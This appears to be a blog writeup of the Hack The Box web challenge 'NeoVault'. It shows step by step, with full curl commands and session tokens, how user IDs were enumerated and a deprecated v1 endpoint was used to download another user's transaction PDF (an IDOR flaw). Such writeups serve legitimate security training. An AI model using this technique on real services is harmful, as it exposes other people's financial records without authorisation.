---
title: 'HTB NeoVault Writeup (challenge)'
date: 2025-07-25
permalink: /posts/2025/07/HTB_NeoVault_Writeup/
tags:
  - HTB
  - writeup
  - very-easy
  - challenge
---

A writeup of the Hack The Box challenge "NeoVault" with very easy difficulty

# NeoVault (very easy)

CHALLENGE DESCRIPTION

Neovault is a trusted banking app for fund transfers and downloading transaction history. You're invited to explore the app, find potential vulnerabilities, and uncover the hidden flag within.

The category is web, so it’s a banking website where we can create an account and login.

After logging in we can see that we can transfer money to another account. 

![image.png](/images/challenges/HTB_NeoVault/image.png)

And we can make a deposit, but when doing so, the site says an error with “under maintenance”.

The site runs next.js with React.

In the Debugger form the inspection menu I found some kind of a secret in a static js file:

![image.png](/images/challenges/HTB_NeoVault/image%201.png)

`SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED`

In the Storage cookies are JSESSIONID and a token.

The default transactions when creating an account comes from the `neo_system` user.

I created this huge command to curl the api data:

`curl 'http://94.237.57.115:42680/api/v2/transactions' \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
-H 'Accept-Language: en-US,en;q=0.5' \
-H 'Accept-Encoding: gzip, deflate' \
-H 'Connection: keep-alive' \
-H 'Cookie: JSESSIONID=01EC602F4453AA3600092A055DC024CA; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4ODM3ODE5MjU5ZmIyNzhkMThmODcwZSIsImlhdCI6MTc1MzQ0NjQzMywiZXhwIjoxNzUzNDUwMDMzfQ.Zy7D5m2Nrn7wVx6gOkopsB6zeAfng-vHb33pTnB05iQ' | jq .`

The api endpoints:

![image.png](/images/challenges/HTB_NeoVault/image%202.png)

We can lookup other users with this API endpoint:

`http://94.237.57.115:42680/api/v2/auth/inquire?username=neo_system`

![image.png](/images/challenges/HTB_NeoVault/image%203.png)

This way I could download transactions via curl:

Trying the v1 enpoint:

`curl -X POST 'http://94.237.57.115:42680/api/v2/transactions/download-transactions' \
-H "Content-Type: application/json" \
-H 'Cookie: JSESSIONID=01EC602F4453AA3600092A055DC024CA; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4ODM3ODE5MjU5ZmIyNzhkMThmODcwZSIsImlhdCI6MTc1MzQ1MDU4NywiZXhwIjoxNzUzNDU0MTg3fQ.mxa-RdjbIbIGc8VxQqaUIjLER0puIfrc2paE5cM_SUw'`

![image.png](/images/challenges/HTB_NeoVault/image%204.png)

`{"message":"_id is not provided"}`

Interesting, let's try the id of the `neo_system` user:

`curl -X POST 'http://94.237.57.115:42680/api/v1/transactions/download-transactions' \
-H "Content-Type: application/json" \
-H 'Cookie: JSESSIONID=01EC602F4453AA3600092A055DC024CA; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4ODM3ODE5MjU5ZmIyNzhkMThmODcwZSIsImlhdCI6MTc1MzQ1MDU4NywiZXhwIjoxNzUzNDU0MTg3fQ.mxa-RdjbIbIGc8VxQqaUIjLER0puIfrc2paE5cM_SUw' \
-d '{"_id": "688377fb259fb278d18f8700"}' \
-o transactions_v1.pdf` 

The PFD shows a user called `user_with_flag`

![image.png](/images/challenges/HTB_NeoVault/image%205.png)

We can get the `_id` of this user with the other endpoint:

`http://94.237.57.115:42680/api/v2/auth/inquire?username=user_with_flag`

`688377fc259fb278d18f8705`

Now we get the transactions PFD from the `user_with_flag` user:

`curl -X POST 'http://94.237.57.115:42680/api/v1/transactions/download-transactions' \
-H "Content-Type: application/json" \
-H 'Cookie: JSESSIONID=01EC602F4453AA3600092A055DC024CA; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4ODM3ODE5MjU5ZmIyNzhkMThmODcwZSIsImlhdCI6MTc1MzQ1MDU4NywiZXhwIjoxNzUzNDU0MTg3fQ.mxa-RdjbIbIGc8VxQqaUIjLER0puIfrc2paE5cM_SUw' \
-d '{"_id": "688377fc259fb278d18f8705"}' \
-o transactions_v1.pdf`

![image.png](/images/challenges/HTB_NeoVault/image%206.png)

![image.png](/images/challenges/HTB_NeoVault/image%207.png)

# Conclusion

What we just performed is a classic example of a broken access control vulnerability, specifically it’s a form of Insecure Direct Object Reference (IDOR).